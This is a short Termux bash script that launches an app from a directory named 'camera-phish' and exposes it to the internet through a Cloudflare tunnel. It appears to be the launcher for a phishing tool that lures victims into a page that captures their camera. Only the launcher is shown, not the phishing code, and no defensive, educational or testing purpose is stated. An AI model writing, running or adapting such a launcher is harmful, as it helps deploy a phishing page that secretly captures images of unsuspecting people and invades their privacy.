#!/data/data/com.termux/files/usr/bin/bash
cd ~/camera-phish
python app.py &
sleep 5
cloudflared tunnel --url http://localhost:5000